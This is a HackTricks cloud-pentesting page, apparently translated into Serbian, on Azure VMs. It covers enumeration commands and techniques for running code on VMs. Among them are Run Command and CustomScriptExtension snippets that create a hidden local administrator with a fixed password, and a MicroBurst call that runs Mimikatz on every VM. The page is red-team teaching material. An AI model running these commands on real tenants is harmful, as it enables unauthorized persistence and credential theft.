# Az - Virtuelne mašine i mreža

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

[Iz dokumenata:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtuelne mašine su jedan od nekoliko tipova [resursa za računanje na zahtev, skalabilnih](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) koje Azure nudi. Obično birate virtuelnu mašinu kada vam je potrebna veća kontrola nad okruženjem za računanje nego što to nude druge opcije. Ovaj članak vam daje informacije o tome šta treba da razmotrite pre nego što kreirate virtuelnu mašinu, kako je kreirati i kako je upravljati.

## Azure Mrežne informacije

Azure mreže sadrže **različite entitete i načine za konfiguraciju.** Možete pronaći kratke **opisne**, **primere** i **komande za enumeraciju** različitih Azure mrežnih entiteta u:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** nudi sigurno, potpuno upravljano RDP (Remote Desktop Protocol) i SSH (Secure Shell) rešenje za pristup preko SSL-a putem Azure portala. Integrisan je unutar Azure Virtuelne Mreže, omogućavajući RDP i SSH povezivanje sa VM-ovima koristeći privatne IP adrese, izbegavajući potrebu za javnim IP adresama. Ovo ga čini sigurnijom, praktičnijom alternativom tradicionalnim metodama koje uključuju dodeljivanje javnih IP adresa i konfiguraciju NSG pravila za pristup VM-ovima. Programeri i IT osoblje mogu sigurno pristupiti VM-ovima sa Azure portala koristeći svoje web pretraživače, pojednostavljujući proces za razvojna i testna okruženja.

Da biste naveli sve Azure Bastion hostove u vašoj pretplati, možete koristiti sledeću komandu:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Enumeracija
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Pokrenite komande u VM-u**

### **AAD prijava u VM-u**

Moguće je omogućiti pristup korisnicima koji su autentifikovani putem AzureAD. Na primer, pokušavajući da pristupite **linux VM-u**: `ssh username@azure-corp.com@1.1.1.1` (važno je **koristiti email** sa azurecorp koji je korišćen prilikom pokušaja prijave) mogli biste dobiti grešku kao: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Samo **pratite te instrukcije** odlaskom na [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i unosom koda, koristite email i lozinku kao akreditive i moći ćete da se povežete putem SSH (ako taj korisnik ima dovoljno dozvola za to: `Virtual Machine Administrator Login` ili `Virtual Machine User Login` uloga).

### **Pokreni Komandu**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Pokreni prilagođenu skriptnu ekstenziju**

Azure virtuelne mašine (VM) ekstenzije su **male aplikacije** koje pružaju konfiguraciju i automatizaciju **zadataka** nakon implementacije na **Azure VM-ovima**. Na primer, ako virtuelna mašina zahteva instalaciju softvera, antivirusnu zaštitu ili mogućnost pokretanja skripte unutar nje, možete koristiti VM ekstenziju.

Stoga, ako imate pristup za pisanje, možete izvršiti proizvoljan kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) je PowerShell alat sličan Ansible-u, koji se koristi za postavljanje hosta putem koda. DSC se integriše sa Azure-om, omogućavajući upload specifičnih konfiguracionih fajlova. Ovi fajlovi moraju da se pridržavaju stroge sintakse. Značajno je da DSC ekstenzija u Azure-u može izvršavati komande iz fajlova koji ispunjavaju određene kriterijume formatiranja, čak i ako sintaksa nije ispravna prema DSC standardima, kao što je prikazano na priloženoj slici.

Izvršenje ovih komandi olakšava [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) funkcija u Az PowerShell-u. Zahtevi uključuju **.PS1** fajl sa definisanom funkcijom, a fajl mora biti upakovan u **.zip** fajl. Iako sintaksa možda nije tačna za DSC, kod će se i dalje izvršiti. Međutim, ekstenzija će označiti status izvršenja kao "neuspeh," i nijedan izlaz iz komande neće biti vidljiv zbog toga što je status prepisan porukom o neuspehu.

### VM Application Definitions

VM Application Definitions omogućavaju ponovljivo postavljanje verzionisanih aplikacija na Azure VM. Ovaj resurs podržava postavljanje i ažuriranje aplikacija širom VMs. Da bi se ovo postavilo, potrebno je nekoliko koraka, uključujući komande kao što su **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** u Az PowerShell-u.

Izvršenje aplikacija ili komandi putem ove metode uključuje **"VMAppExtension,"** koja se automatski instalira kada se aplikacija primeni na VM. Ekstenzija preuzima fajl sa specificiranog URI i imenuje ga tačno kao aplikaciju, bez ekstenzije. Da bi se fajl ispravno izvršio, polje "ManageActions" u REST API pozivu mora biti konfigurisano da preimenuje fajl sa odgovarajućom ekstenzijom. Postavljanje ove metode, kada se završi, će ličiti na strukturu prikazanu na priloženoj slici.

Međutim, ova metoda izvršenja je relativno spora, traje oko 3-4 minuta da izvrši aplikaciju ili komandu. Fajlovi povezani sa ovim procesom se čuvaju u specifičnim direktorijumima (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` za kopiju aplikacije i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` za status izvršenja).

Obe tehnike pružaju jedinstvene načine za izvršavanje komandi i postavljanje aplikacija u Azure okruženjima, svaka sa svojim skupom zahteva, koraka i razmatranja.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) su funkcija u Azure-u koja omogućava izvršavanje Runbook-a, konfiguranih u Automation Account-u, na Azure Virtual Machine (VM) koja je deo određenog HWG-a. Ovo izvršenje se olakšava putem ekstenzije instalirane na VM-u, koja postavlja Runbook kod na VM. Značajan aspekt ovog procesa je da stvarne akreditive nisu faktor u izvršenju jer se kod izvršava sa povišenim privilegijama, specifično kao **SYSTEM** ili root, kao što je ilustrovano na priloženoj slici.

Ključna informacija za one koji koriste Windows 10 VMs je potreba da se specificira verzija PowerShell-a za Runbook. Trebalo bi da se postavi da se izvršava kao PowerShell Verzija 5.1 umesto 7.1. Ovaj zahtev proističe iz činjenice da PowerShell 7.1 nije instaliran po default-u na ovim VMs, što dovodi do neuspeha u izvršenju skripte ako je verzija 7.1 specificirana.

Ova funkcija Azure-a nudi robustan metod za automatizaciju i upravljanje zadacima širom hibridnih okruženja, omogućavajući centralizovano upravljanje i izvršenje zadataka na Azure VMs.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
